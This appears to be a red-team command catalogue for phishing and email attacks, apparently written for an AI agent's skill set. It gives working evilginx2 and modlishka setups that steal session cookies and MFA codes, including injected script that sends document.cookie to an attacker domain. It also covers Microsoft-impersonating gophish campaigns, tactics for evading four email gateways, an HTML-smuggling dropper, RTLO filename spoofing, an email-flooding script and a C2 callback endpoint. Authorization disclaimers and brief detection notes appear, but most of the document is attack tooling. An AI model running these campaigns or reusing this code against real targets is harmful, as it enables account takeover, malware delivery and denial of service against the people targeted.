# Email Security Deep — Payloads & Command Catalogue

> Companion to `SKILL.md`. Every command assumes lawful authorization, an executed NDA, a signed SoW naming the target recipients, sender identities, test window, and data-handling requirements for captured credentials/sessions. Unscoped phishing is a crime in most jurisdictions.
>
> Placeholder convention: `<target.com>` (victim org), `<victim@target.com>` (recipient), `<phish-domain>` (look-alike domain you have registered/authorized), `<lure_url>` (evilginx2 lure URL), `<gophish_key>` (gophish API key), `<c2_url>` (your authorized callback endpoint).

---

## 1. evilginx2 — AiTM Reverse Proxy (MFA Bypass)

### 1.1 Installation & First Run

```bash
# Clone and build evilginx2 (Go required)
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make                              # builds ./bin/evilginx

# Pre-stage directory structure
mkdir -p phishlets data logs
sudo cp -r phishlets/* phishlets/  # default phishlets

# Launch (root required for port 53/80/443 binding)
sudo ./bin/evilginx -p phishlets -d
#   -p phishlets  → phishlet directory
#   -d            → developer/debug mode
```

### 1.2 Core Configuration (inside evilginx CLI)

```
# Set the campaign domain and IP (must match DNS A record)
config domain <phish-domain>
config ip <your_vps_public_ip>

# Configure TLS (Let's Encrypt via ACME is built-in)
config redirector_ip <redirector_ip>     # optional, masks origin

# Bind a phishlet to a subdomain
phishlets hostname office365 login.<phish-domain>
phishlets enable office365

# Verify the phishlet comes up
phishlets

# Create a lure
lures create office365
lures edit 0 path '/security-reset'      # URL path victims hit
lures edit 0 redirect_url 'https://www.microsoft.com/en-us/'  # post-capture bounce
lures edit 0 phishlet sub_404 'false'    # don't return 404 on bad sub

# Retrieve the lure URL victims will click
lures get-url 0
# → https://login.<phish-domain>/security-reset?id=ABC123
```

### 1.3 Authoring a Custom Phishlet (O365 — excerpt)

```yaml
# phishlets/office365.yaml — illustrative excerpt, see evilginx2 phishlet format docs
author: 'kali-claw'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www',   orig_sub: 'www',   domain: 'office.com',         session: true, is_landing: false}
  - {phish_sub: 'outlook',orig_sub: 'outlook',domain: 'office365.com',     session: true, is_landing: false}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'brcap', 'mkt']
  - domain: '.office.com'
    keys: ['rt', 'rt_FedAuth', 'MSPAuth', 'MSAuth1', 'RPSSecAuth']
  - domain: '.office365.com'
    keys: ['rt', 'FedAuth', 'rt_FedAuth']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
  code:
    key: 'code'
    search: '([0-9]{6})'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/'

# JS injection — runs in victim's browser on the proxied page
injects:
  - domain: 'login.microsoftonline.com'
    trigger: 'login'
    content: |
      // FIDO2 detection (see Section 14)
      if (window.PublicKeyCredential) {
        window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()
          .then(function(uvpa) {
            if (uvpa) fetch('https://login.<phish-domain>/beacon/fido2', {method:'POST'});
          });
      }
```

### 1.4 Session Capture Workflow

```
# Once a victim completes login + MFA through the proxy:
sessions
#  id   phishlet    username                tokens   ip          create_time
#  0    office365   victim@target.com       8        203.0.113.9 2026-06-17 10:42:03

# Export captured tokens for import into attacker browser (Cookie Quick Manager)
sessions 0
# prints the captured cookies for this session

# After review, delete per SoW
sessions delete 0
```

### 1.5 Operational Tips

- **Use a redirector** (Cloudflare Workers, Nginx, custom Caddy) so the true origin IP is not exposed via DNS / TLS history.
- **Rotate lure IDs** periodically; static lure IDs are a tell.
- **Monitor `sessions` table size** — a phishlet left running unattended will accumulate captured data; tear down when no longer needed.
- **The `ESTSAUTHPERSISTENT` cookie** is the key token for Azure AD persistent sessions; with this alone you can often import a session and operate.

---

## 2. evilgophish — evilginx2 + gophish Integration

### 2.1 What it Adds

- Wraps evilginx2 + gophish into a single orchestration script
- Auto-redirects victims from gophish landing page to evilginx2 lure URL
- Aggregates telemetry from both (email delivery + click + credential + session)
- Pre-built phishlet + template + landing page bundles

### 2.2 Setup

```bash
git clone https://github.com/An0nUD4Y/evilgophish.git
cd evilgophish

# Edit config
cat > config.json <<EOF
{
  "evilginx_path": "/opt/evilginx2",
  "gophish_path":  "/opt/gophish",
  "phishlet":      "office365",
  "phish_domain":  "<phish-domain>",
  "gophish_admin": "https://127.0.0.1:3333",
  "gophish_key":   "<gophish_key>"
}
EOF

# Launch (starts both evilginx2 and gophish, configures lure, exposes URL)
./evilgophish.sh
```

### 2.3 Campaign Launch via Combined Stack

```bash
# evilgophish exposes a helper that creates gophish entities + evilginx lure
./evilgophish.sh create-campaign \
  --name "Q2-redteam-001" \
  --template templates/urgent-password-reset.html \
  --group groups/engineering.csv \
  --sender "Microsoft Security <noreply@<phish-domain>>"
```

### 2.4 Combined Telemetry Pull

```bash
# Pull gophish results
curl -k https://127.0.0.1:3333/api/campaigns/1/results?api_key=$GOPHISH_API_KEY

# Pull evilginx2 sessions (via REST API if enabled, or via CLI dump)
sudo ./bin/evilginx -p phishlets -d -c 'sessions; exit'

# Merge on victim email/username to produce end-to-end funnel report:
#   sent → delivered → opened → clicked → credential-captured → session-captured → fido2-blocked
```

---

## 3. modlishka — Flexible Reverse Proxy with Template Injection

### 3.1 When to Use modlishka vs evilginx2

| | evilginx2 | modlishka |
|---|-----------|-----------|
| Phishlet model | Per-service YAML phishlets | Generic — any service, JS template injection |
| Configuration | Declarative | Imperative flags |
| Strength | Pre-built O365/Google/etc phishlets, polished | Genericity — works against niche services w/o phishlet |
| Use case | Standard AiTM campaign | Niche / bespoke service |

### 3.2 Build & Run

```bash
git clone https://github.com/drk1wi/modlishka.git
cd modlishka
make

# Launch against a generic target
sudo ./modlishka \
  -proxyaddress 0.0.0.0 \
  -proxyport 443 \
  -targetdomain login.target.com \
  -listeningdomain <phish-domain> \
  -cert cert.pem -certkey key.pem \
  -trackparams 'username,password,code,session' \
  -jsrules 'rules.json'
```

### 3.3 JS Rule Example

```json
// rules.json — inject this into the proxied page
{
  "login.target.com": [
    {
      "pattern": "</body>",
      "replace": "<script>fetch('https://<phish-domain>/beacon',{method:'POST',body:document.cookie})</script></body>"
    }
  ]
}
```

### 3.4 Operational Note

modlishka's permissiveness cuts both ways — it will proxy anything, including services you didn't intend to phish. Scope it tightly via `-targetdomain` to avoid inadvertently capturing credentials for out-of-scope services.

---

## 4. gophish — Campaign Platform

### 4.1 Install & First Run

```bash
# Download from getgophish.com
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-arm64.zip
unzip gophish-v0.12.1-linux-arm64.zip
chmod +x gophish

# Edit config.json — bind admin interface to localhost only
# {
#   "admin_server": {"listen_url": "127.0.0.1:3333", ...},
#   "phish_server": {"listen_url": "0.0.0.0:80", ...}
# }

./gophish
# Initial admin password printed to stdout — CHANGE FIRST
# Access via SSH tunnel: ssh -L 3333:127.0.0.1:3333 user@vps
```

### 4.2 Sending Profile (SMTP relay)

```bash
# Via API
curl -k -X POST https://localhost:3333/api/smtp/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "microsoft-relay",
    "host": "mail.<phish-domain>:587",
    "from_address": "Microsoft Security <noreply@<phish-domain>>",
    "username": "sender",
    "password": "staged-cred",
    "ignore_cert_errors": false,
    "headers": {"X-Priority": "1", "X-MS-Exchange-Organization-MessageClass": "IPM.Note"}
  }'

# Test sending
curl -k -X POST https://localhost:3333/api/smtp/1/send_test_email \
  -H "Authorization: Bearer $GOPHISH_API_KEY"
```

### 4.3 Landing Page (with evilginx2 redirect)

```bash
curl -k -X POST https://localhost:3333/api/pages/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -d '{
    "name": "office365-login",
    "html": "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0; url={{.URL}}\"></head><body>Redirecting…</body></html>",
    "redirect_url": "https://login.<phish-domain>/security-reset",
    "capture_credentials": false,
    "capture_passwords": false
  }'

# {{.URL}} is gophish magic — replaced with the tracking link
# Click is tracked by gophish; final redirect to evilginx2 lure
```

### 4.4 Email Template

```bash
curl -k -X POST https://localhost:3333/api/templates/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -d '{
    "name": "urgent-password-reset",
    "subject": "Action Required: Password Expiry in 24h",
    "html": "<html><body><p>Dear {{.FirstName}},</p><p>Your password expires in 24 hours. Reset now to avoid account lockout.</p><p><a href=\"{{.URL}}\">Reset Password</a></p><p>— Microsoft Security</p></body></html>",
    "text": "Dear {{.FirstName}}, password expires in 24h. Reset: {{.URL}}",
    "attachments": []
  }'

# {{.FirstName}}, {{.LastName}}, {{.Email}}, {{.URL}}, {{.TrackerURL}} are gophish magic tokens
# {{.URL}} and {{.TrackerURL}} are the click-tracking link and the 1x1 beacon respectively
```

### 4.5 Recipient Group

```bash
# CSV format: First Name,Last Name,Email,Position
cat > engineering.csv <<EOF
First Name,Last Name,Email,Position
Jane,Engineer,jane@target.com,Senior Engineer
Bob,Manager,bob@target.com,Eng Manager
EOF

# Import via API
curl -k -X POST https://localhost:3333/api/groups/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -F "name=engineering-team" \
  -F "file=@engineering.csv"
```

### 4.6 Launch Campaign

```bash
curl -k -X POST https://localhost:3333/api/campaigns/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -d '{
    "name": "Q2-redteam-001",
    "template": {"name": "urgent-password-reset"},
    "page": {"name": "office365-login"},
    "smtp": {"name": "microsoft-relay"},
    "groups": [{"name": "engineering-team"}],
    "launch_date": "2026-06-20T09:00:00Z"
  }'
```

### 4.7 Pull Results (post-campaign report)

```bash
CAMPAIGN_ID=1
curl -k https://localhost:3333/api/campaigns/$CAMPAIGN_ID/results?api_key=$GOPHISH_API_KEY | jq '.'
# Returns: sent, opened, clicked, submitted (if cred capture), error, per-recipient timeline
```

---

## 5. King-Phisher — Alternative Campaign Platform

### 5.1 Install (server + client)

```bash
# Server side (Ubuntu/Debian)
wget -q https://github.com/rsmusllp/king-phisher/raw/master/tools/install.sh
sudo bash install.sh

# Launch server
sudo king-phisher-rpc -C king-phisher.yml &

# Client (GUI)
king-phisher
```

### 5.2 When to Use King-Phisher over gophish

- Awareness-training use case (built-in template scoring, click-rate dashboards for HR)
- GTK desktop UX preferred
- Need SMB-aware beacon callbacks (King-Phisher has stronger internal-network callback options)

### 5.3 Sample Campaign (excerpt from YAML config)

```yaml
# campaign.yaml
name: Q2-awareness-test
message:
  subject: "Required: Security Training"
  html_file: templates/training.html
  text_file: templates/training.txt
smtp:
  server: mail.<phish-domain>
  port: 587
  username: sender
  password_file: /etc/king-phisher/smtp.pass
web:
  url: https://training.<phish-domain>/start
  track_visits: true
targets:
  - email: jane@target.com
    name: "Jane Engineer"
```

---

## 6. Email Gateway Evasion — Proofpoint

### 6.1 Proofpoint URL Defense Behavior

- Rewrites URLs in delivered mail to `https://urldefense.proofpoint.com/v2/url?u=<base64-encoded>&d=DwMFaQ&...`
- At click time, Proofpoint resolves the encoded URL, checks fresh threat intel, and either:
  - Allows (browser redirects to original)
  - Blocks (presents warning page)
  - Sandboxes (presents page through Proofpoint browser isolation)

### 6.2 Evasion Approaches (authorized testing)

- **Delayed activation**: host benign content at delivery time, swap to malicious at click time. URL Defense's click-time check is the counter-control — test that you can defeat it via short-rotation DNS or fast-flux.
- **File-type allowlist abuse**: Proofpoint often allows `.html`, `.htm` for direct attachment. HTML smuggling reconstructs the binary client-side — gateway sees only HTML.
- **Look-alike domain rotation**: register multiple look-alikes, rotate daily; threat-intel lag works in your favor.
- **Encrypted archive**: `.zip` with password (sent in separate channel or pre-text). Proofpoint cannot unzip without the password, so cannot detonate.
- **Macro-free payload**: Proofpoint detonation often focuses on macros; HTML/JS smuggling or signed-binary abuse (Sigthief) bypasses.

### 6.3 Detecting URL Defense in Delivered Mail

```bash
# Send a probe mail and inspect received headers/body
swaks --to probe@target.com --from test@<phish-domain> \
  --server mail.target.com \
  --header "Subject: probe" \
  --body "https://<phish-domain>/test"

# On the receiving side, inspect:
grep -E '(urldefense|X-PP|Proofpoint)' /var/mail/victim
# If URLs are rewritten, you'll see urldefense.proofpoint.com prefix
```

### 6.4 Bypass Test: bypassing URL rewrite

```bash
# Some Proofpoint configs exclude certain domains from rewriting
# (allow-listed internal domains, certain TLDs, etc.)
# Test: which of your look-alikes escape rewriting?

for d in micros0ft-login.com m1crosoft-login.com microsoft-security.net; do
  swaks --to probe@target.com --from test@$d \
    --body "https://$d/test" --server mail.target.com
  # Inspect received mail — is the URL rewritten or original?
done
```

---

## 7. Email Gateway Evasion — Mimecast

### 7.1 Mimecast Auth Posture / URL Expansion

- Mimecast rewrites URLs at click time (similar to Proofpoint)
- Mimecast sandbox detonates attachments
- Mimecast evaluates sender reputation (DKIM/SPF/DMARC + Mimecast's own reputation DB)

### 7.2 Evasion Approaches

- **DKIM-aligned sending**: spoofed-from on a look-alike with SPF/DKIM/DMARC aligned for your look-alike — passes Mimecast's auth check (note: this does NOT spoof the real Microsoft, it just makes your look-alike look legitimate).
- **Look-alike + warmed IP**: warm up your sending IP via small-volume legitimate-looking traffic for 7-14 days; Mimecast reputation ramps.
- **Attachment sandboxing bypass**: encrypted-zip (password out-of-band), or HTML smuggling, or signed-but-malicious binary.
- **Mimecast "Permitted Senders" abuse**: if a target has misconfigured Permitted Senders (e.g., allowed `*@sharepointonline.com`), register a look-alike at `sharepointonline.com` (won't work — that's Microsoft's real domain — but variants like `sharepoint-online-portal.com` may slip if misconfigured).

### 7.3 Probe Test

```bash
# Send probe mail with a tracking pixel
swaks --to probe@target.com --from "SharePoint <noreply@<phish-domain>>" \
  --body '<img src="https://<phish-domain>/beacon/probe1.png" width=1 height=1 />' \
  --header "Content-Type: text/html" \
  --server mail.target.com

# Check your beacon server access log for hits from Mimecast IP ranges
# (Mimecast pre-fetches images for some configs)
tail -f /var/log/nginx/access.log | grep -E '(mimecast|193|91)'
```

---

## 8. Email Gateway Evasion — Cisco ESA (IronPort)

### 8.1 Cisco ESA Key Features

- DLP (data loss prevention) for outbound; for inbound, anti-spam/anti-phish
- Sandbox detonation (Cisco ThreatGRID / Talos)
- URL filtering (Talos reputation)
- Mail policies per-sender

### 8.2 Evasion Approaches

- **Talos reputation ramp**: brand-new sending IPs are scored low; warm up via legitimate-looking traffic
- **Attachment type allowlist**: Cisco ESA often allows `.iso`, `.img`, `.lnk` that other gateways block. Test each extension against the client's policy.
- **Header injection abuse**: ESA sometimes processes X-headers in ways that bypass DLP — test malformed headers.
- **Mail-policy race**: some ESA configs apply different policies to internal-vs-external senders; if you can spoof an internal sender (depends on SPF enforcement — see `email-protocol-attack`), you may bypass inbound scan.

### 8.3 Probe — Mail-Policy Detection

```bash
# Send two probes — one "internal", one "external" — compare treatment
swaks --to probe@target.com --from internal@target.com \
  --body "test1" --server mail.target.com
swaks --to probe@target.com --from external@external.com \
  --body "test2" --server mail.target.com

# Compare X-IronPort-* headers on the receiving side
# If internal-spoofed probe has fewer anti-spam headers, policy bypass exists
```

---

## 9. Email Gateway Evasion — Microsoft Defender for Office

### 9.1 Defender Safe Links

- Rewrites URLs in mail to `https://*.safelinks.protection.outlook.com/?url=<encoded>&data=...`
- At click time, checks current URL reputation (not just delivery-time)
- Re-writes URLs in Teams/Office documents too

### 9.2 Defender Safe Attachments

- Detonates attachments in VM sandbox before delivery
- If sandbox detects malicious behavior → quarantines; if clean → delivers
- Has "Dynamic Delivery" mode — delivers text + placeholder, swaps in attachment post-detonation

### 9.3 Evasion Approaches

- **Time-of-check vs time-of-use (TOCTOU)**: host benign content at delivery; switch to malicious in the click-time window. Safe Links counter-checks at click time, so the window is narrow — but DNS rotation / fast-flux can defeat.
- **Detonation-aware payload**: payloads that detect sandbox (sleep long, check for VM artifacts, check user interaction) and only execute malicious path on real victim. (See `skills/av-edr-evasion/`.)
- **HTML smuggling**: gateway sees only HTML/JS; reconstruction happens in victim's browser post-delivery.
- **Macro-free initial access**: bypass macro blocking via `search-ms:` protocol, `.url` files, `ms-msdt:` (recently restricted), or signed-binary abuse.
- **Defender "tenant allow/block list" abuse**: if a target has over-permissive allow-list entries (e.g., allowed `*.sharepoint.com` even though they don't use SharePoint), use that domain for hosting.

### 9.4 Safe Links Rewriting Probe

```bash
# Send probe; inspect received body
swaks --to probe@target.com --from test@<phish-domain> \
  --body '<a href="https://<phish-domain>/test">click</a>' \
  --header "Content-Type: text/html" \
  --server mail.target.com

# On receiving side:
grep -o 'safelinks.protection.outlook.com' /var/mail/victim
# If present → Safe Links is rewriting
# Inspect which domains are excluded from rewriting (Tenant Allow/Block List)
```

---

## 10. Sender Reputation Engineering (for Spoofing Success)

> **Note**: This section overlaps with `email-protocol-attack` at the high level (SPF/DKIM/DMARC fundamentals). Here we go DEEPER on the *reputation* layer — BIMI, ARC, MX hygiene, IP warmup — for the goal of *spoofing success* (delivering as a look-alike identity that the gateway trusts).

### 10.1 The Reputation Stack

```
Layer          | What Gateways Evaluate
─────────────────────────────────────────────────
SPF            | IP-based sender authorization (protocol layer — see email-protocol-attack)
DKIM           | Cryptographic signature (protocol layer — see email-protocol-attack)
DMARC          | SPF+DKIM alignment enforcement (protocol layer)
─────────── below: reputation layer (this section) ───────────
BIMI           | Brand Indicators (visible logo) — gateway/user trust signal
ARC            | Authenticated Received Chain — preserves auth across forwarders
MX hygiene     | Are your MX records clean (no orphaned MX, no leaky subdomains)?
IP reputation  | Warming up new IPs, monitoring for blacklists (Spamhaus, Barracuda)
Domain age     | Brand-new domains are scored low; warm up with non-phish traffic first
TLS reporting  | TLS-RPT shows you whether your mail is reaching via TLS or being downgraded
DMARC reports  | rua reports tell you what mail is being sent "as you"
Volume ramp    | New IP at full volume = flagged; gradual ramp = trusted
```

### 10.2 BIMI Setup (trust signal)

```dns
// DNS TXT record at default._domainkey.<phish-domain>
// (BCI — BIMI Certification Indicator; requires VMC from CA)
default._domainkey.<phish-domain>.  IN  TXT "v=BIMI1;l=https://<phish-domain>/logo.svg;a=https://<phish-domain>/vmc.pem"
```

### 10.3 ARC Setup (forwarding)

```dns
// ARC preserves auth across legitimate forwarders
// Setup involves signing outbound with ARC-Seal header
// See RFC 8617
```

### 10.4 IP Warmup Schedule (new sending IP)

```text
Day 1-2:     10 msgs/hr to internal test addresses
Day 3-5:     50 msgs/hr, ramp to 200/day
Day 6-9:     500 msgs/day, mix of senders
Day 10-14:   2000 msgs/day
Day 15+:     full campaign volume
```

### 10.5 Blacklist Monitoring

```bash
# Check major blacklists (periodic during campaign)
for bl in zen.spamhaus.org bl.spamcop.net b.barracudacentral.org; do
  reversed=$(echo $SENDING_IP | awk -F. '{print $4"."$3"."$2"."$1}')
  dig +short $reversed.$bl A
done

# If listed → pause campaign, request delisting per blacklist process
```

### 10.6 DMARC Report Analysis (sender side)

```bash
# Your rua reports tell you what's being sent "as you" — useful to detect impersonation of YOUR look-alike
# Set rua mailbox, parse incoming XML reports
grep -lr 'dmarc' /var/mail/dmarc/ | while read f; do
  python3 dmarc_parse.py < $f
done
```

---

## 11. Email Bombing / DoS

### 11.1 BombErAtom (authorized DoS — notification fatigue test)

```bash
git clone https://github.com/BombErAtom/Email-Bomber.git
cd Email-Bomber
python3 email_bomber.py \
  --target victim@target.com \
  --count 200 \
  --threads 8 \
  --delay 2 \
  --provider list.txt   # list of public SMTP providers (use only authorized)

# IMPORTANT: keep count low (100-200) for fatigue-testing; high counts cause real harm
# (mail quota exhaustion, legitimate mail bounce, IR team distraction)
```

### 11.2 Custom Python Flooder (rate-limited)

```python
# flood.py — for AUTHORIZED notification-fatigue test only
import smtplib, threading, time
from email.mime.text import MIMEText

RATE = 5  # msgs/sec per thread
THREADS = 4
DURATION = 60  # seconds

def flood(target, stop):
    while not stop.is_set() and time.time() < start + DURATION:
        msg = MIMEText(f"notification {time.time()}")
        msg['Subject'] = 'notification'
        msg['From'] = 'noreply@<phish-domain>'
        msg['To'] = target
        try:
            with smtplib.SMTP('mail.<phish-domain>', 587, timeout=10) as s:
                s.sendmail('noreply@<phish-domain>', [target], msg.as_string())
        except Exception: pass
        time.sleep(1.0/RATE)

if __name__ == '__main__':
    import sys
    target = sys.argv[1]
    stop = threading.Event()
    start = time.time()
    ts = [threading.Thread(target=flood, args=(target, stop)) for _ in range(THREADS)]
    for t in ts: t.start()
    for t in ts: t.join()
```

### 11.3 Defense-Side Detection (for the report)

```bash
# Aggregate inbound to single mailbox per minute
awk '/to=<victim@target\.com>/ {print substr($1,1,15)}' /var/log/mail.log \
  | sort | uniq -c | sort -rn | head

# Alert threshold: > 50 msgs/min to single recipient from diverse senders
# Remediation: gateway rate-limit per recipient + CAPTCHA on inbound form-to-mail
```

---

## 12. Landing Page + Payload Staging

### 12.1 HTML Smuggling (gateway sees only HTML/JS)

```html
<!-- payload.html — reconstructs binary client-side -->
<script>
// Base64-encoded binary (placeholder)
const payload_b64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAAA...";
const payload_bin = atob(payload_b64);
const bytes = new Uint8Array(payload_bin.length);
for (let i = 0; i < payload_bin.length; i++) bytes[i] = payload_bin.charCodeAt(i);
const blob = new Blob([bytes], {type: 'application/octet-stream'});
const url = URL.createObjectURL(blob);
const a = document.createElement('a');
a.href = url;
a.download = 'document.pdf.exe';  // or hide extension via LFI/RTLO
document.body.appendChild(a);
a.click();
</script>
```

### 12.2 Decrypted-on-Click Attachment

```bash
# Build encrypted zip with password
zip -e --password 'P@ssw0rd2026' document.zip payload.exe

# Send password via separate channel (SMS, second mail, landing-page text)
# Gateway cannot unzip without password → cannot detonate → delivers as-is
```

### 12.3 Right-to-Left Override (RTLO) for Extension Spoofing

```bash
# File named: invoice[U+202E]txt.scr  → displays as invoice scr.txt
# Embed RTLO unicode in filename
# Many gateways now strip RTLO — test effectiveness
mv payload.exe $'invoice\xe2\x80\xaetxt.scr'
```

### 12.4 Landing-Page Trust Signals

- **TLS** — must be valid cert; mismatched/self-signed is an instant tell
- **Brand logo** — pulled from real site (verify licensing; or use client's authorized brand assets in test)
- **No "phishing-tells"** — no spelling errors, no broken images, no off-brand fonts
- **Mobile-rendering** — majority of clicks are mobile; test on iOS Safari + Android Chrome
- **Favicon** — pull from real site (often overlooked)

---

## 13. Post-Click Telemetry & Beacon Design

### 13.1 Open Tracking (1x1 Beacon)

```html
<!-- In email body (HTML) -->
<img src="https://<phish-domain>/beacon/open?id={{.TrackerURL}}" width="1" height="1" alt="" />
```

```python
# beacon.py — Flask endpoint
from flask import Flask, request, send_file, Response
app = Flask(__name__)

@app.route('/beacon/open')
def beacon_open():
    victim_id = request.args.get('id')
    # log victim open event
    log_event(victim_id, 'open', request.headers.get('User-Agent'))
    return Response(send_file('1x1.png'), mimetype='image/png')
```

### 13.2 Click Tracking

```python
@app.route('/click')
def click():
    victim_id = request.args.get('id')
    log_event(victim_id, 'click', request.headers.get('User-Agent'))
    return redirect('https://login.<phish-domain>/lure/0')
```

### 13.3 C2 Callback Patterns

```python
# Victim machine calls back after payload executes
@app.route('/c2/register', methods=['POST'])
def c2_register():
    data = request.json
    victim_id = data['victim_id']
    hostname = data['hostname']
    user = data['user']
    log_event(victim_id, 'c2_register', {'hostname': hostname, 'user': user})
    return {'next_checkin': 60}
```

### 13.4 Funnel Report Generation

```python
# Aggregate per victim: sent → delivered → opened → clicked → cred-captured → session-captured → fido2-blocked
import pandas as pd
events = pd.read_sql('select * from events', conn)
funnel = events.groupby('victim_id')['event'].apply(list)
funnel.to_csv('campaign_funnel.csv')
# Then build funnel-count report:
#   sent:           100
#   delivered:       98
#   opened:          45
#   clicked:         18
#   cred-captured:   12
#   session-captured: 9
#   fido2-blocked:    3
```

---

## 14. FIDO2 / Hardware Key Detection & Pivot

### 14.1 Browser-Side Detection

```javascript
// inject on landing page; signal C2 if FIDO2 present
async function check() {
  if (!window.PublicKeyCredential) return;
  const uvpa = await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
  if (uvpa) {
    // AiTM will fail — FIDO2 assertion is bound to legitimate origin
    // Pivot required; signal C2
    fetch('https://<phish-domain>/beacon/fido2', {
      method: 'POST',
      body: JSON.stringify({victim_id: window.__victim_id__})
    });
    // Show alternative UI: device-code flow, consent phishing, etc.
  }
}
check();
```

### 14.2 Pivot Options When FIDO2 Blocks AiTM

| Pivot | Description | Notes |
|-------|-------------|-------|
| **Device-code flow phishing** | Present user with real Microsoft device-code prompt; ask them to enter the code at the legit login (passes MFA, attacker gets device token) | See `skills/cloud-identity-attack/` |
| **OAuth consent phishing** | Register an Azure AD app with sensitive scopes; ask victim to consent | Effective even with FIDO2 |
| **Session-token theft via XSS** | If target app has XSS, steal session token directly (no MFA involved) | Requires target-app vuln |
| **Token relay** | If victim has active session in another app (e.g., Edge with SSO), relay that | Browser/SSO dependent |
| **Pick a different target** | FIDO2 deployment is rarely uniform — find a user on TOTP/push | Realistic for large orgs |

### 14.3 FIDO2-Bypass Reporting (control strength)

When your campaign repeatedly fails against FIDO2-protected accounts, that is a positive security finding. Document:

```markdown
## Control Strength: FIDO2 Hardware Keys

The engagement measured FIDO2 deployment across 100 recipients. Of 18 click-throughs:

- 12 completed credential submission on AiTM page
- 9 of those reached MFA prompt
- 0 of 9 captured a session cookie (all used FIDO2 platform authenticator)
- 3 of 9 pivoted to device-code flow (compensating test)
- 0 of 3 device-code pivots succeeded (target users trained to refuse device-code prompts)

Recommendation: continue FIDO2 rollout; mandate FIDO2 for privileged roles; retain device-code-prompt
blocking; consider conditional access policies requiring compliant device.
```

---

## 15. Real-World AiTM Campaigns (Reference)

### 15.1 CozyCar / CozyDuke

- Russian APT (APT29) AiTM-flavored campaign
- Used credential-harvesting landing pages tied to malicious macro docs
- Lesson: combo of email-delivered macro + credential-capture landing

### 15.2 EvilProxy (MaaS, 2022+)

- Phishing-as-a-Service platform built on evilginx2-style AiTM
- Sold subscriptions to other actors
- Targeted O365, Google, GMX accounts
- Bypassed TOTP, push, SMS — could NOT bypass FIDO2
- Defeated by Microsoft's "Compliant Device" conditional access

### 15.3 NakedTenant (2023+)

- Targets Azure AD tenant enumeration + AiTM
- Identifies users without FIDO2, then phishes them specifically
- Demonstrates the value of FIDO2-uniform rollout

### 15.4 Reproducing in Lab

```bash
# Lab reproduction (authorized training only)
# 1. Stand up evilginx2 with O365 phishlet against a test O365 tenant
# 2. Create test users: user_totp (TOTP MFA), user_push (push), user_fido2 (FIDO2)
# 3. Run campaign against each
# 4. Measure: AiTM succeeds for totp/push; fails for fido2
# 5. Confirm conditional access "require compliant device" blocks AiTM session replay
```

---

## Appendix A: Quick Command Reference

| Action | Command |
|--------|---------|
| Launch evilginx2 | `sudo ./bin/evilginx -p phishlets -d` |
| Get lure URL | `lures get-url 0` |
| List captured sessions | `sessions` |
| Launch gophish | `./gophish` |
| gophish API: create sending profile | `curl -k -X POST https://localhost:3333/api/smtp/ -H "Authorization: Bearer $KEY" -d '{...}'` |
| gophish API: launch campaign | `curl -k -X POST https://localhost:3333/api/campaigns/ -H "Authorization: Bearer $KEY" -d '{...}'` |
| Launch modlishka | `sudo ./modlishka -proxyaddress 0.0.0.0 -proxyport 443 ...` |
| Check DMARC posture | `checkdmarc target.com` |
| Verify spoofing | `python3 espoofer.py -i test.txt` |
| Send probe via swaks | `swaks --to x@y --from a@b --server mail.y` |
| Email bomb (authorized) | `python3 email_bomber.py --target x@y --count 200 --threads 8` |
| Check blacklist | `dig +short <reversed-ip>.zen.spamhaus.org A` |

## Appendix B: Tool Quick-Install

```bash
# evilginx2
git clone https://github.com/kgretzky/evilginx2 && cd evilginx2 && make

# gophish (Linux ARM64)
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-arm64.zip
unzip gophish-v0.12.1-linux-arm64.zip && ./gophish

# King-Phisher
wget https://github.com/rsmusllp/king-phisher/raw/master/tools/install.sh && sudo bash install.sh

# espoofer
git clone https://github.com/chenjj/espoofer.git && cd espoofer && pip3 install -r requirements.txt

# checkdmarc
pip3 install checkdmarc
```
